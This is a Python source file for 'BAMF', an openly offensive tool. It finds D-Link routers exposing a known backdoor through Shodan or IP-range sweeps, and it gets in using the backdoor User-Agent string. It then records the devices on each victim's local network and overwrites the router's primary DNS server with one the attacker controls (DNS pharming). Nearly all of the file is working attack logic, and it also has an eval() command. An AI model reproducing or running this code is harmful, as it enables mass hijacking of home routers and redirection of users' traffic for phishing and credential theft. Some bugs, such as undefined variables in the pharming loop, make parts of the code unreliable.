#!/usr/bin/env python

# standard library
import os
import sys
import time
import Queue
import struct
import socket
import pprint
import getopt
import random
import logging
import sqlite3
import urllib2
import argparse
import tempfile
import threading

# packages
import shodan
import colorama
import mechanize

LOGO = """

                 :+***+:      -*#%#+:             
                *@@@@@@@+    #@@@@@@@=            
      .:----    @@@@@@@@*    %@@@@@@@+    :---:   
     =@@@@@@*:  .*@@@@@%.    :@@@@@%=.  -@@@@@@%: 
     %@@@@@@@+    .@@@@@-    -@@@@@.    #@@@@@@@# 
     =@@@@@@@%:   =@@@@@@-  =@@@#@@-  .=@@@@@@@@- 
      .-+%@@@@@#- *@@@@@@@+*@@@@@@@-.-%@@@@@#-:   
         .#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@*      
          .@@@@@@@@@@@@@%@@@@@@@@@@@@@@@@@%.      
           -@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@-       
            =@@@@@@@@@@%@@%@@@@@@@@@@@@@@-        
             #@@@@@@@@@@@@@@@@@@@@@@@@@@=         
             .+#%%%%%%%%@%%@%%%%%%@@@@%=          
              .+****************#*****+.          
              #@@@@@@@@@@@@@@@@@@@@@@@@=          
               :----------------------:           
                                                  
                                                  
        #%%%%#*:   -%%%+   =%%%+  :%%%#  #%%%%%%= 
        @@@**@@@:  #@@@@   +@@@@: *@@@@  @@@****- 
        @@@- %@@- :@@@@@-  +@@@@*.@@@@@  @@@-     
        @@@#%@@#. +@@*@@#  +@@@@@+@@@@@  @@@%%%=  
        @@@++@@@- @@@:@@@: +@@*@@@@*@@@  @@@*++:  
        @@@- #@@+=@@@@@@@+ +@@+#@@@:@@@  @@@-     
       .@@@##@@@-#@@=.-@@@.+@@+-@@# @@@  @@@-     
        ++++++-. +++   +++:-++- ++: +++  +++: 

"""


class Bamf(mechanize.Browser):

    """
    Virtual browser capable of spidering through the web
    looking for administration panels for D-Link routers
    vulnerable to CVE-2013-6027 and changing their DNS
    server settings

    """

    __tbl_config = """BEGIN TRANSACTION;
CREATE TABLE IF NOT EXISTS tbl_config (
    shodan_api text DEFAUL NULL
);
COMMIT;
"""

    __tbl_routers = """BEGIN TRANSACTION;
CREATE TABLE IF NOT EXISTS tbl_routers (
    ip varchar(15) DEFAULT NULL,
    port tinyint(3) DEFAULT NULL,
    model text DEFAULT NULL,
    vulnerability text DEFAULT NULL,
    signature text DEFAULT NULL,
    dns varchar(15) DEFAULT NULL
);
COMMIT;
"""

    __tbl_devices = """BEGIN TRANSACTION;
CREATE TABLE IF NOT EXISTS tbl_devices (
    router varchar(15) DEFAULT NULL,
    device text DEFAULT NULL,
    ip varchar(15) DEFAULT NULL,
    mac varchar(16) DEFAULT NULL
);
COMMIT;
"""

    __signatures = [
       "admin_frm",
        "brl-04cw",
        "brl-04cw-u",
        "brl-04r",
        "brl-04ur",
        "brl-04ur",
        "brl04ur",
        "di-524",
        "di-524",
        "di-524up",
        "di-524up",
        "di-604+",
        "di-604up",
        "di-615",
        "di-624s",
        "di524up",
        "di615",
        "di624s",
        "dir-524",
        "dir-524up",
        "dir-604+",
        "dir-604up",
        "dir-615",
        "dir-624s",
        "dir524",
        "dir604+",
        "dir615",
        "dlink_firmware_v1.0",
        "h_wizard.htm",
        "help.htm",
        "home/h_wizard.htm",
        "httpd-alphanetworks/2.23",
        "index.htm",
        "index1.htm",
        "menu.htm",
        "settings saved",
        "thttpd alphanetworks 2.23",
        "thttpd-alphanetworks 2.23",
        "thttpd-alphanetworks 2.23",
        "thttpd-alphanetworks/2.23",
        "tm-5240",
        "tm-g5240",
        "tm-g5240",
        "tm-g5240",
        "tm5240",
        "tmg5240",
        "tools_admin.htm",
        "tools_admin.xgi"
        ]

    __vulnerability = 'CVE-2013-6026'

    def __init__(self, shodan_api=None):
        """
        Initialize a new Bamf instance

        `Optional`
        :param str shodan_api:  Shodan API key

        """
        mechanize.Browser.__init__(self)
        self._models = {}
        self._targets = {}
        self._devices = []
        self._threads = []
        self._backdoors = []
        self._queue = Queue.Queue()
        self._query = 'alphanetworks/2.23'
        self._ports = [8000, 8080, 8888]
        self._semaphore = threading.Semaphore(value=1)
        self._database = sqlite3.connect('database.db')
        self._database.executescript(self.__tbl_config)
        self._database.executescript(self.__tbl_routers)
        self._database.executescript(self.__tbl_devices)
        self._shodan = self._init_shodan(shodan_api)
        self.addheaders = [('User-Agent', 'xmlset_roodkcableoj28840ybtide')]
        self.set_handle_robots(False)
        self.set_handle_redirect(True)
        self.set_handle_refresh(True)
        self.set_handle_equiv(True)
        self.set_handle_referer(True)
        self.set_debug_http(False)
        self.set_debug_responses(False)

    def _init_shodan(self, shodan_api):
        parameters = {"shodan_api": shodan_api}
        n = self._database.execute("SELECT (SELECT count() from tbl_config) as count").fetchall()[0][0] 
        if isinstance(shodan_api, str):
            if n == 0:
                _ = self._database.execute("INSERT INTO tbl_config (shodan_api) VALUES (:shodan_api)", parameters)
            else:
                _ = self._database.execute("UPDATE tbl_config SET shodan_api=:shodan_api", parameters)

            self._database.commit()

            return shodan.Shodan(shodan_api)

        else:
            if n == 0:
                warn("No Shodan API key found (register a free account at https://account.shodan.io/register)")
            else:
                shodan_api = self._database.execute("SELECT shodan_api FROM tbl_config").fetchall()[0][0]
                if shodan_api:
                    return shodan.Shodan(shodan_api)


    def _threader(self):
        while True:
            try:
                method, args = self._queue.get()
                if callable(method):
                    debug(args)
                    worker = method(*args)
            except:
                break

    def _save(self):
        for device in self._devices:
            _ = self._database.execute("INSERT INTO tbl_devices (router, device, ip, mac) VALUES (:router, :device, :ip, :mac)", device)
        for backdoor in self._backdoors:
            _ = self._database.execute("INSERT INTO tbl_routers (ip, port, model, vulnerability, signature) VALUES (:ip, :port, :model, :vulnerability, :signature)", backdoor)
        self._database.commit()

    def _pharm(self, ip, port, dns):
        url = 'http://{}:{}/Home/h_wan_dhcp.htm'.format(ip, port)
        request = self.open(url, timeout=3.0)
        form = self.select_form("wan_form")
        self['dns1'] = dns
        self.submit()
        self._save()
 
    def _map(self, ip, port):
        request = self.open('http://{}:{}/Home/h_dhcp.htm'.format(ip, port), timeout=3.0)
        html = request.get_data().splitlines()
        for line in html:
            try:
                parts = line.split('","')
                if len(parts) >= 3 and valid_ip(parts[1]):
                    if 'ist=[' not in line and 'erver=[' not in line:

                        name = parts[0].strip('["')
                        lan_ip = parts[1]
                        mac = parts[2]
                        lan_device = {"router": ip, "device": name, "ip": lan_ip, "mac": mac}

                        self._devices.append(lan_device)

                        print('  |')
                        print(colorama.Fore.CYAN + colorama.Style.BRIGHT + '[+]' + colorama.Fore.RESET + ' Device {}'.format(len(self._devices)) + colorama.Style.NORMAL)
                        print('  |   Device Name: ' + colorama.Style.DIM + name + colorama.Style.NORMAL)
                        print('  |   Internal IP: ' + colorama.Style.DIM + lan_ip + colorama.Style.NORMAL)
                        print('  |   MAC Address: ' + colorama.Style.DIM + mac + colorama.Style.NORMAL)

            except Exception as e:
                debug(str(e))

    def _scan(self, ip, port):
        target = 'http://{}:{}'.format(ip, port)
        debug("Requesting {}".format(target))
        try:

            self._semaphore.acquire()

            conn = self.open(target, timeout=2.0)
            html = conn.get_data()

            if not html or not self.viewing_html():
                return

            elif conn.code == 200:
                for signature in self.__signatures:
                    if signature in html:

                        model = str(self.title())

                        self._backdoors.append({"ip": ip, "port": port, "model": model, "vulnerability": self.__vulnerability, "signature": signature})

                        print("  | ")
                        print("  |      " +  colorama.Fore.GREEN + colorama.Style.BRIGHT + "[+] " + colorama.Fore.RESET + " Backdoor {}".format(str(len(self._backdoors))) + colorama.Style.NORMAL)
                        print("  |      IP: " + colorama.Style.DIM + ip + colorama.Style.NORMAL)
                        print("  |      Port: " + colorama.Style.DIM + "{}/tcp".format(port) + colorama.Style.NORMAL)
                        print("  |      Model: " + colorama.Style.DIM + model + colorama.Style.NORMAL)
                        print("  |      Vulnerability: " + colorama.Style.DIM + self.__vulnerability + colorama.Style.NORMAL)
                        print("  |      Signature: " + colorama.Style.DIM + signature + colorama.Style.NORMAL)
            else:
                return

            self._semaphore.release()

        except KeyboardInterrupt:
            return
        except Exception as e:
            debug(str(e))

    def pharm(self, dns):
        """
        Change the primary DNS server of vulnerable routers

        `Required`
        :param str dns:     IP address of a user-controlled DNS server

        """
        try:
            if not len(self._backdoors):
                error("no backdoored routers to pharm (use 'scan' to detect vulnerable targets)")
            elif not valid_ip(dns):
                error("invalid IP address entered for DNS server")
            else:
                for i, router in enumerate(self._backdoors):

                    self._pharm(router['ip'], router['port'], dns)

                    devices = self._database.execute("SELECT (SELECT count() from tbl_devices WHERE router=:router) as count", {"router": ip}).fetchall()[0][0]

                    print(colorama.Fore.MAGENTA + colorama.Style.NORMAL + '[+]' + colorama.Fore.RESET + ' Router {}:{} - DNS Server Modified'.format(ip, port))
                    print('  |   DNS Server:   ' + colorama.Style.DIM + '{}:53'.format(dns) + colorama.Style.NORMAL)
                    print('  |   Connected Devices: ' + colorama.Style.DIM + '{}\n'.format(size) + colorama.Style.NORMAL)

        except KeyboardInterrupt:
            return
        except Exception as e:
            debug(str(e))

    def scan(self, *args):
        """
        Scan target hosts for signatures of a backdoor

        `Optional`
        :param str ip:      IP address of target router
        :param int port:    Port number of router administration panel

        """
        try:
            print("\nScanning {} targets...".format(len(self._targets)))
            startlen = len(self._backdoors)

            if len(args):
                ip, _, port = args[0].partition(' ')

                if valid_ip(ip) and port.isdigit(port):
                    self._targets[ip] = int(port)
                    self._scan(ip, port)
                    print(colorama.Fore.CYAN + "\n[+]" + colorama.Fore.RESET + " Scan complete - " + colorama.Style.BRIGHT + "1" + colorama.Style.NORMAL + " backdoor(s) found\n")
                else:
                    error("invalid IP address or port number")
            else:
                if len(self._targets):
                    for ip, port in self._targets.items():
                        self._scan(ip, port)
                    print(colorama.Fore.CYAN + "\n[+]" + colorama.Fore.RESET + " Scan complete - " + colorama.Style.BRIGHT + str(len(self._backdoors) - startlen) + colorama.Style.NORMAL + " backdoor(s) found\n")
                else:
                    error("no targets to scan")
                    self.help()

            self._save()

        except KeyboardInterrupt:
            return
        except Exception as e:
            debug(str(e))

    def map(self, *args):
        """
        Discover devices connected in local networks of backdoored routers

        `Optional`
        :param str ip:      IP address of target router
        :param int port:    Port number of router administration panel

        """
        try:
            if not len(self._backdoors):
                error('no backdoored routers with local networks to map')

            if len(args):
                ip, _, port = args[0].partition(' ')
                if not valid_ip(ip):
                    error("invalid IP address")
                elif not port.isdigit() or not (0 < int(port) < 65356):
                    error("invalid port number")
                else:
                    self._map(ip, int(port))
                    self._save()
            else:
                for backdoor in self._backdoors:
                    print('\nMapping Network {}...\n'.format(self._backdoors.index(backdoor) + 1))
                    self._map(backdoor['ip'], backdoor['port'])
                self._save()

        except KeyboardInterrupt:
            return
        except Exception as e:
            debug(str(e))

    def search(self, ip_range=None):
        """
        Utilize the IoT search-engine, Shodan, to search for vulnerable routers

        `Optional`
        :param str ip_range:    target IP range in CIDR notation (ex. 192.168.1.1/24)

        """
        try:
            if isinstance(self._shodan, shodan.Shodan):

                if isinstance(ip_range, str):

                    print('\nTarget IP range: {}'.format(ip_range))
                    print('\nSearching Shodan for vulnerable routers...')

                    subnet = cidr_to_ip_range(ip_range)
                    previous = len(self._targets)

                    for ip in subnet:
                        try:
                            time.sleep(1)
                            host = self._shodan.host(ip)
                            for data in host['data']:
                                for port in self._ports:
                                    if port == data['port']:
                                        if self._query in data['http']['server']:
                                            self._targets[ip] = port
                        except Exception as e:
                            debug(str(e))

                    current = len(self._targets)

                    print('\nAdded {} hosts to targets'.format(current - previous))

                else:

                    print('\nSearching Shodan for vulnerable routers...')

                    for i, item in enumerate(self._shodan.search_cursor(self._query)):
                        ip = item.get('ip_str').encode()
                        port = item.get('port')
                        self._targets[ip] = port

                    print("\nAdded {} new targets\n".format(i + 1))

            else:
                    print('\nTarget IP range: {}'.format(ip_range))
                    print('\nSearching internet for vulnerable routers...')

                    if isinstance(ip_range, str):

                        subnet = cidr_to_ip_range(ip_range)
                        previous = len(self._targets)

                        for ip in subnet:
                            for port in self._ports:
                                method = self._scan
                                target = (ip, port)
                                task = (method, target)
                                self._queue.put(task)

                        self._threads = [threading.Thread(target=self._threader) for _ in range(10)]

                        for t in self._threads:
                            t.setDaemon(True)
                            t.start()

                        for t in self._threads:
                            t.join(timeout=1.0)

                        current = len(self._targets)

                        print('\nAdded {} new targets\n'.format(current - previous))

                    else:
                        error('invalid IP address/range')

        except KeyboardInterrupt:
            return
        except Exception as e:
            debug(str(e))

    def help(self, *args):
        """
        Show usage information

        """
        print('\n' + colorama.Fore.YELLOW + colorama.Style.BRIGHT + '   COMMAND             DESCRIPTION' + colorama.Fore.RESET + colorama.Style.NORMAL)
        print('   search           ' + colorama.Style.DIM + '   query the Shodan IoT search engine for targets' + colorama.Style.NORMAL)
        print('   scan [ip]        ' + colorama.Style.DIM + '   scan target host(s) for backdoors' + colorama.Style.NORMAL)
        print('   map [ip]         ' + colorama.Style.DIM + '   map local network(s) of vulnerable routers' + colorama.Style.NORMAL)
        print('   pharm <dns>      ' + colorama.Style.DIM + '   modify the dns server of vulnerable routers' + colorama.Style.NORMAL)
        print('   targets          ' + colorama.Style.DIM + '   show current targets' + colorama.Style.NORMAL)
        print('   backdoors        ' + colorama.Style.DIM + '   show backdoors detected this sessions' + colorama.Style.NORMAL)
        print('   devices          ' + colorama.Style.DIM + '   show devices connected to backdoored routers'+ colorama.Style.NORMAL)
        print('   exit/quit        ' + colorama.Style.DIM + '   end session and exit program\n' + colorama.Style.NORMAL)

    def backdoors(self, *args):
        """
        Show all detected backdoors

        """
        pprint.pprint(self._backdoors)
        print(colorama.Fore.MAGENTA + '\n[+] ' + colorama.Style.BRIGHT + colorama.Fore.RESET + str(len(self._backdoors)) + colorama.Style.NORMAL + ' backdoors confirmed\n')

    def targets(self, *args):
        """
        Show all target hosts

        """
        pprint.pprint(self._targets)
        print(colorama.Fore.GREEN + '\n[+] ' + colorama.Style.BRIGHT + colorama.Fore.RESET + str(len(self._targets)) + colorama.Style.NORMAL + ' targets ready to scan\n')

    def devices(self, *args):
        """
        Show all discovered devices connected to vulnerable routers

        """
        pprint.pprint(self._devices)
        print(colorama.Fore.CYAN + '\n[+] ' + colorama.Style.BRIGHT + colorama.Fore.RESET + str(len(self._devices)) + colorama.Style.NORMAL + ' devices connected to vulnerable routers\n')

    def eval(self, code):
        """
        eval() code directly in the current context (for debugging purposes)

        `Required`
        :param str code:    Python code

        """
        try:
            print eval(code)
        except Exception as e:
            debug(str(e))

    def quit(self, *args):
        """
        End the session and exit BAMF

        """
        sys.exit(0)

    def exit(self, *args):
        """
        End the session and exit BAMF

        """
        sys.exit(0)

    def run(self):
        """
        Run BAMF

        """
        while True:

            try:

                cmd, _, arg = raw_input(colorama.Style.BRIGHT + "[bamf]> " + colorama.Style.NORMAL).partition(' ')

                if hasattr(self, cmd):
                    getattr(self, cmd)(arg) if len(arg) else getattr(self, cmd)()
                else:
                    debug("unknown command: '{}' (use 'help' for usage information)".format(cmd))

            except KeyboardInterrupt:
                sys.exit(0)
            except Exception as e:
                debug(str(e))

            self.run()

# utilities
def debug(msg):
    globals()['logger'].debug(str(msg))

def error(msg, color='RED'):
    print ('\n' + getattr(colorama.Fore, color)  + colorama.Style.BRIGHT + '[-] ' + colorama.Fore.WHITE + 'Error - '   + colorama.Style.NORMAL + msg + '\n')

def warn(msg, color='YELLOW'):
    print ('\n' + getattr(colorama.Fore, color)  + colorama.Style.BRIGHT + '[!] ' + colorama.Fore.WHITE + 'Warning - ' + colorama.Style.NORMAL + msg + '\n')

def info(msg, color='GREEN'):
    print (getattr(colorama.Fore, color)  + colorama.Style.BRIGHT + '[+] ' + colorama.Fore.WHITE + colorama.Style.NORMAL  + msg)

def enter(msg, color='CYAN'):
    return raw_input('\n' + getattr(colorama.Fore, color) + colorama.Style.NORMAL + "[>] " + colorama.Fore.WHITE + msg + ': ').lower()

def prompt(q, *args, **kwargs):
    color = kwargs.get('color') if 'color' in kwargs else 'YELLOW'
    if len(args):
        return raw_input('\n' + colorama.Style.NORMAL + getattr(colorama.Fore, color) + "[?] " + colorama.Fore.WHITE + q + '? ' + '(' + '/'.join(args) + '): ' + colorama.Style.NORMAL).lower()
    else:
        return raw_input('\n' + colorama.Style.NORMAL + getattr(colorama.Fore, color) + "[?] " + colorama.Fore.WHITE + q + '?  ' + colorama.Style.NORMAL).lower()
    
def valid_ip(address):
    try:
        socket.inet_aton(address)
    except socket.error:
        return False
    return address.count('.') == 3

def cidr_to_ip_range(cidr):
    ip, _, cidr = str(cidr).partition('/')
    if not (valid_ip(ip) and cidr.isdigit() and int(cidr) <= 32):
        error("invalid IP range - use CIDR notation (ex. 192.168.1.1/24)")
    cidr = int(cidr) 
    host_bits = 32 - cidr
    i = struct.unpack('>I', socket.inet_aton(ip))[0]
    start = (i >> host_bits) << host_bits
    end = start | ((1 << host_bits) - 1) 
    return [ socket.inet_ntoa(struct.pack('>I',i)) for i in range(start, end) ]

# main
def main():
    bamf = Bamf(shodan_api=options.shodan)
    bamf.run()


if __name__ == '__main__':

    print(colorama.Fore.RED + LOGO + colorama.Fore.RESET)

    parser = argparse.ArgumentParser(
        prog='bamf.py', 
        version='0.1.2', 
        description='Backdoor Access Machine Farmer')

    parser.add_argument(
        '--shodan',
        action='store',
        type=str,
        help='Shodan API key')

    parser.add_argument(
        '--debug',
        action='store_true',
        help='print debugging output to the console')

    options = parser.parse_args()

    logging.basicConfig(level=logging.DEBUG if options.debug else logging.ERROR, handler=logging.StreamHandler)
    logger = logging.getLogger(__name__)
    main()
